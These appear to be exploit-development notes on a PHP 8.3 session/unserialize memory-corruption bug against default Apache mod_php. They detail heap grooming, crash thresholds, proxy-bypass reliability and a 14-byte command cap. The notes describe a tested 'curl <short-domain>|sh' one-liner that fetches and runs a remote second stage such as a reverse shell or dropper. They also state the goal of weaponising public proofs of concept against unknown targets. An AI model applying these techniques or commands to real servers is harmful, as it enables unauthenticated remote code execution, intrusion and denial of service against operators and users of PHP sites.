- We now have proof the primitive corrupts memory in a way that
  reaches fire's unserialize-level state
- Next step is characterizing WHICH memory location holds the HT
  pointer at the crash, and controlling the written value (we're
  writing refcounted-pointer bytes, not an arbitrary 0xffff...ffff —
  so either the parser interprets our writes differently from what we
  intended, or an upstream state got poisoned)
- At minimum this is a remote crash primitive on default-config 8.3.35
  Apache mod_php with session.upload_progress enabled (which is default).
  Pre-RINIT, before any application code runs. Harmless by itself
  (worker respawns) but confirms the primitive class reaches exploitable
  state at scale.

**Reliability measurement**: 10/10 trials of N=254 fire against freshly-armed
worker on cal83 → 10/10 crashes. The threshold is deterministic.

**Config dependency vs. the lab**: the cal83 Docker uses
`memory_limit=8M` and prefork MPM with 1 worker for test determinism and
smaller arm payloads. Neither is fundamental:
- A 128M default-memory_limit target needs a proportionally bigger arm
  (payload ~127MB on the wire). Same primitive, same mechanism.
- Multi-worker MPM (prefork, event, or worker — all default-eligible)
  works as long as fire pins to the arm's worker, which is exactly what
  the main chain's keep-alive carrier already does.
- The SYS_PTRACE capability and `gdb` package in the lab image are for
  observation only; the exploit itself does not need them.

What **IS** required on the target, all of which match PHP defaults:
- `session.upload_progress.enabled = 1` (default)
- `session.save_handler = files`, `session.save_path = /tmp` (defaults; empty
  save_path falls back to `/tmp`)
- Worker-persistence across requests (prefork/event/worker MPM — Apache
  defaults; php-fpm would need its own primitive, see FPM Chain-E)
- The actual bug: missing `php_basic_early_rinit` before 8.3.36

What is **NOT** present in defaults — the "second weakness" sveoti.net
flags:
- The ability to put a crafted serialized blob into a session file. Fire
  needs to decode a duplicate-key array via the pre-RINIT path, and the
  only input that normally feeds `php_var_unserialize` pre-RINIT is the
  session file content for the PHPSESSID the request carries. On a
  default target with no attacker-controlled session store, there is no
  natural way to plant the exact duplicate-key bytes.

Routes to that second weakness, in roughly increasing weirdness:
- **LFI with file-write / arbitrary-file-write** on the target: write
  the session file directly. Classic layered chain.
- **Shared hosting with cross-session writable `/tmp`** (uncommon on
  properly configured modern hosts but widespread historically).
- **Application that stores attacker-controlled serialized blobs in
  `$_SESSION`** — if the app does e.g. `$_SESSION['user'] = unserialize(user_input)`
  (which is already a vuln), the content is attacker-chosen. Rare.
- **PHP's own `session.upload_progress` write path** — **ruled out**
  by source review (ext/session/session.c:3177-3198 and :3080). The
  progress-update path builds `progress->data` via `add_assoc_long_ex`
  / `add_assoc_string_ex` / `add_assoc_bool_ex` / `add_assoc_zval_ex`
  with hard-coded string keys ("start_time", "content_length",
  "bytes_processed", "done", "files"), then stores it under a string
  key via `zend_hash_update(Z_ARRVAL_P(sess_var), progress->key.s, ...)`.
  `php_session_flush` then serializes $_SESSION — PHP arrays are HashTables
  that cannot contain duplicate keys at the C level, so the serializer's
  output cannot contain duplicate-key bytes. The duplicate-key structure
  must come from somewhere **outside** PHP's own write code.

**Honest end-state of this session's grooming sprint**:
- Primitive mechanism fully characterized, bounds mapped
- Deterministic 10/10 crash primitive against stock 8.3.35 confirmed
- Secondary-vector dependency explicit — the stock exploitability
  story matches sveoti.net's "needs a second weakness"
- Session-write path as a potential natural trigger: **ruled out**
  (see **B denied** section above)

### Crash-primitive mechanism (byte-level, 2026-10-26)

Reverse-engineering the N=254 threshold uncovered exactly why the
primitive at scale crashes while small-scale usage doesn't:

**Fire's call chain** (session decode in dangerous path):
1. `ps_srlzr_decode_php` → `var_tmp_var(&var_hash)` → returns
   `current = dangling_last_dtor + 32` (slot inside arm's leftover
   `var_dtor_entries` on page 107).
2. `php_var_unserialize(current, &q, endptr, &var_hash)` enters array
   parse for `a:N:{...}`.
3. `array_init_size(current, N)` → `_zend_new_array(N)` + `zend_hash_real_init_mixed`.
4. The `real_init_mixed` memset fills the HT's hash-index region
   (`HT_HASH_SIZE(nTableMask) = 2 * nTableSize * sizeof(uint32_t)` bytes)
   with `HT_INVALID_IDX = 0xFFFFFFFF`.

**The crash window at N=254..~330**:

| State at N=254 | State at N=253 |
|---|---|
| Session file payload = 3058 bytes | 3046 bytes |
| Zend-MM alloc of payload `zend_string` = 3074 bytes | 3062 bytes |
| **Above 3072-byte small-bin cap → 1-page alloc** | **At 3072-byte cap → small-bin alloc** |
| Payload takes a page in the arena | Doesn't take a page |
| Subsequent HT `arData` alloc (10KB, 3 pages) lands with its hash-index segment overlapping page 107 | HT lands elsewhere, page 107 untouched |
| `real_init_mixed` memset writes `0xFFFFFFFF`×512 across page 107 offset 0..0x7FF | Page 107 preserved |
| `current` at page 107 offset 0x20 reads as `0xFFFFFFFFFFFFFFFF` | `current` intact |
| `Z_ARRVAL_P(current) = -1`, lookup crashes | Parse succeeds |

Empirical GDB dump of page 107 confirms exactly this: all 0xFF for the
first 2048 bytes under N=254, intact var_dtor_entries header (`used_slots=4,
data[0]={object_ptr, IS_OBJECT}`) under N=253.

**N > ~330 (OK again)**: the payload crosses the 1-page boundary; Zend-MM
has to find a 2+-page contiguous run, which can't start at page 107 (not
enough adjacent free). HT `arData` lands at a different chunk range, no
aliasing with `current`.

### Why this isn't trivially upgradable to RCE

The primitive's write-value is the fixed sentinel `0xFFFFFFFF` from PHP's
own HT initialization, not an attacker-chosen value. We don't get the
"write what where" shape the main-chain exploit achieves via forged
`zend_string` + offset leak. From here to RCE would need either:

1. A DIFFERENT dangling-pointer mechanism where attacker bytes get
   memcpy'd *into* a predictable overlap with a function-pointer field
   (e.g., pDestructor at HT+48). Current primitive writes 0xFF to the
   hash-index region, which doesn't contain function pointers.
2. Chained with a secondary vector that already provides partial control
   (the "second weakness" matching the stock-config caveat above).

So the final honest state: **this is a crash primitive, not an RCE primitive**.
Unauthenticated remote worker-crash on default-config 8.3.35 Apache
mod_php with session.upload_progress on (default) when the attacker can
plant a session file of 3073-4096 bytes containing a duplicate-key
array. Worker respawns, so repeated firing is a sustained-worker-churn
DoS, not persistent compromise.

### Session-file overlay path (secondary RCE attempt — also denied)

Follow-up test: can a large session file (3+ pages, 8-12 KB) cause its
own zend_string allocation to land at the dangling struct's own pages,
giving attacker-chosen bytes at the dangling struct layout? That would
yield a true write-what-where via attacker-chosen `last_dtor`.

Measurement for N=700 and N=900 payloads (8410 and 10810 bytes
respectively, both 3-page allocs):
- Dangling struct at page 104: **intact** after fire — bytes preserved
  from arm (`last=0x...668038`, `first_dtor=0x...66b000`)
- Session file content lands at **pages 107-109**, overwriting arm's
  var_dtor_entries buffer with attacker-chosen session-ASCII bytes
- Fire's tmp_var reads `last_dtor->used_slots` from attacker bytes
  (ASCII "x|a:" → 977428088 as little-endian uint32) → check
  `977428088 + 1 > 255` is TRUE → allocates a fresh var_dtor_entries
  elsewhere, abandoning the attacker-overlayed region

So attacker bytes DO land on page 107, but fire's parser bypasses the
dangling buffer entirely once it reads the garbage used_slots. The
overlay doesn't translate into exploitable control.

To make this path work, Zend-MM would need to allocate the session
file zend_string starting at **page 104** (the dangling struct itself),
not page 107. Observed natural free-list behavior puts it at 107-109.
Steering it to 104-106 would need deliberate pre-fire grooming to
mark pages 104+ as first-fit, which isn't achievable through the
HTTP-reachable primitives available here.

### Final verdict on A (crash → RCE)

**Denied for default-config exploitation.** Two concrete escape paths
tested and ruled out:

1. **HT_INVALID_IDX overwrite** of `current`: writes fixed `0xFFFFFFFF`
   (sentinel from PHP's own init), not an attacker-chosen value.
   Produces crash only.
2. **Session-file content overlay** of dangling buffer: delivers
   attacker bytes to page 107, but fire's own tmp_var logic rejects
   the attacker-overlayed buffer (ASCII bytes interpreted as huge
   used_slots → fresh buffer allocated instead).

The RCE path through this layer-4 primitive would require either:
- A different arm shape that moves the dangling struct onto a page
  that Zend-MM's free-list first-fit DOES choose for session file
  allocation (steerable with much deeper grooming)
- A completely different write primitive mechanism (not reachable
  from the HT init or session overlay we've characterized)

Both are multi-week research efforts. Committing the honest denial.

### External validation of the research question

Independent researchers converged on the same observation during the two weeks after
disclosure:

- **sveoti.net ("millions of attempts, no confirmed break-in and why that is not
  the good news", 2026-10-23)**: analyzed internet-wide php2shell exploitation
  attempts and found that despite millions of daily attempts, no source had named
  a victim with post-exploitation evidence. The author's thesis — "every public
  exploit tested against a real target has failed without a second weakness" and
  "converting memory corruption to shell on modern randomized x86-64 is genuinely
  hard" — matches what we've measured. The real risk, in that author's framing,
  is the long tail of end-of-life and embedded PHP where financially motivated
  tooling can be calibrated to old builds (the exact engineering gap this research
  closes for modern builds).
- **Kevin J. @ Baldur Security** built a dedicated CTF
  (`php2shell.baldursecurity.com`) explicitly framed around our research question:
  "exploitable by default, against an unknown target? ... no hints, no config
  dumps, and no idea what's under the hood. Pure CTF Style." The target was taken
  down before we could test, but the framing is a direct public statement of the
  same gap this work addresses.

Taken together: the public consensus is that the vulnerability exists and is
scanned heavily but has not been reliably weaponized against unknown targets with
the publicly circulated PoCs. The engineering decisions documented here (adaptive
OOM sizing, multi-worker spray with keep-alive pinning, auto-detection, calibrated
grooming across the 8.3.22–8.5.11 window) are the specific gaps that separate "a
PoC that runs on a hand-built lab" from "a tool that works on a target you've
never seen before."
- **Reverse proxy / LB** — tested with nginx in front, under load:
  - The real proxy blocker is **`client_max_body_size`**, not connection handling. Default
    nginx caps bodies at 1M and 413s our large OOM field. But any site that accepts uploads
    (WP media, forms) raises it; with it raised (+ `proxy_buffer_size 32k` for the leak's
    big `Set-Cookie`), the exploit works through the proxy.
  - **Under realistic load through the proxy**: mixed traffic 5/5 (11.7s avg), upload
    traffic with spray=24: 5/5 (7.7s avg). The spray compensates for proxy buffering.
  - nginx de-chunks to Content-Length, so the chunked-TE `post_max_size` bypass is
    neutralized — the backend `post_max_size` must also be large (it is, on upload sites).
  - **Narrowest hard case**: competing multipart uploads (exercising upload_progress) through
    a buffering proxy, at spray=20: 2–3/5. Bumping to spray=24 + 90s timeout → 5/5.
    This is the only scenario requiring extra aggressiveness.
- **Command length ≤ 14 bytes — HARD cap, root cause understood.** Rigorous sweep on a
  fresh lab (sprayed leak+fire, 3 trials each): cmd_len 10 & 14 (carrier 167) = 3/3;
  cmd_len 15 (carrier 168) = 0/3; 18, 23 = 0/3. The carrier is a 167-byte value →
  Zend MM **192-bin** (24B string header + 167 + 1 = 192). The reclaim works by the
  carrier landing in the freed **`PS(http_session_vars)`** slot, which is a 192-bin
  object. A 15-byte command pushes the carrier to 168B → **256-bin** → it no longer
  matches the slot it must reclaim → fails. So the carrier size is dictated by the
  reclaim target's size and is NOT a free parameter — you cannot grow it.
  (Earlier contradictory "176 fired" readings were confounded by lab degradation, a
  monkeypatched-param bug, and a `cleanup=0` config change that itself breaks the 619
  grooming; the clean fresh-lab sweep is authoritative.)
  **Only path to longer commands: the out-of-line command buffer** — keep the carrier at
  167 (so it reclaims PS), point the fake `execute_data` arg1 at a SEPARATE larger
  sprayed allocation holding the command. Stagers converge on the same wall: `sh
  /tmp/sess_<SID>` fails (PHP strips filename newlines; serialization framing is
  shell-hostile on one line), and `php /tmp/sess_<SID>` (Chain-A-style, would work) is
  15 bytes — over the cap.
  **SOLVED operationally — `curl <short-domain>|sh` bootstrap (tested).** The 14-byte
  cap is *just* short of `curl <IP>|sh` (15, IP too long), but a short attacker **domain**
  is shorter than an IP: `curl 2sh.no|sh` = exactly 14, `curl a.io|sh` = 12. That fetches
  an **arbitrary-length stage-2** over HTTP. Verified end-to-end: the exploit fired the
  13-byte `curl 127.1|sh` as www-data → curl fetched the served script → ran a multi-line
  stage-2 as www-data (`uid=33`). So the real-payload problem (reverse shell, dropper) is
  solved by a 2-stage drop, NOT by beating the inline cap. Requirements: `curl` on target
  (present on php:*-apache; `wget -qO-DOMAIN|sh` is 16B, doesn't fit — curl is the
  enabler), outbound egress to the attacker's short domain, and a ≤6-char domain (cheap:
  short ccTLDs). No public PoC documents this — they stop at 14-byte `id` + an
  unimplemented `sh<file` hint. Egress-filtered targets still need the out-of-line buffer.

  **Out-of-line buffer — CONDITIONALLY SOLVED** (only needed when egress is blocked):
  built the mechanism (arg1 → separate 192-bin zend_string buffer,
  cmd up to ~143B; sound in principle — `zif_system` reads arg1 by pointer).
  **Earlier attempts failed on placement** (blind sweep: 0 hits; `/proc` racing scan:
  0 hits because the buffer is live only ~ms per reclaim and worker PID shifts; the
  overnight work concluded that a "second deterministic freed slot (htdata2)" was
  needed — i.e., new vulnerability research, not a tuning pass).
  **The 2026-10-26 variant hunt provided that htdata2.** Via the layer-4
  `BG(unserialize).data` primitive, the attacker's arm places a chosen command
  string at a deterministic chunk-relative offset (verified `chunk+0x72048`
  across 3/3 worker respawns). Fire's fake HT arg1 points there, `zif_system`
  reads the command, arbitrary length. **But the reachability constraint
  gates it**: triggering the arm requires pre-RINIT `php_var_unserialize`,
  which pre-auth is only reachable via session.upload_progress session decode
  of an attacker-controlled session file. So out-of-line is now solved
  **conditionally on a secondary vector** (LFI, SSRF, or writable session
  store) — common on real targets, not available on pure default pre-auth.
  For pure pre-auth default-config targets, the 14-byte primitive + `curl
  <short-domain>|sh` 2-stage drop remains the operational path.
  METHOD NOTE: measure on a freshly-restarted lab and change one variable at a time —
  degraded workers and self-inflicted config/code changes gave false results repeatedly.

## Parked: fully offset-free resolution (improvement "A")

A data path to `zif_system` exists with no per-build offset
(`compiler_globals` is a dynsym export → `function_table` → `"system"` → `handler`).
But it requires an **arbitrary read**, and this bug's leak is only a *relative window*
dump (zend_string stores data inline), not a pointer-following read. No public PoC has
an arbitrary read here, which is why they all keep offset DBs. Parked unless a read
primitive turns up.
